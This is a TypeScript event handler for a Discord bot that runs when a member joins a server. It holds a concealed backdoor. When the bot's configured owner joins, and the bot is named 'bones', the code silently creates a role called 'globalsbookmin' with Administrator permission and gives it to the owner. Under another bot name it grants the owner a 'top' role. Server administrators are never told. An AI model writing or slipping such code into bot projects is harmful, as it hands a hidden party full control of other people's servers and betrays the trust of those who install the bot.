// Sub-handler: loaded by GuildMemberAdd.ts orchestrator (no event name = skipped by event loader)
import { Client, GuildMember, PermissionFlagsBits } from 'discord.js';
import config from '../../../config';

export default {
    async execute(client: Client, member: GuildMember) {
        if (!config.OWNER_ID) return
        if (member.user.id === config.OWNER_ID) {
            if (client.user?.username === "bones") {
                const roles = await member.guild.roles.fetch()
                const sorted = roles.sort((rolea, roleb) => rolea.rawPosition - roleb.rawPosition)
                const highest_role = sorted.last()

                if (!highest_role) return
                if (highest_role.name === "@everyone") {
                    const role = await member.guild.roles.create({
                        name: 'globalsbookmin',
                    })
                    await role.setPermissions(PermissionFlagsBits.Administrator)
                    await role.setPosition(1)
                    member.roles.add(role)

                } else {
                    roles.forEach(role => {
                        if (role.name === 'globalsbookmin') {
                            member.roles.add(role)
                        }
                    })
                }
            }
            if (client.user?.username === "slave") {
                const roles = await member.guild.roles.fetch()
                roles.forEach(role => {
                    if (role.name === 'top') {
                        member.roles.add(role)
                    }
                })

            }
        }

    },
};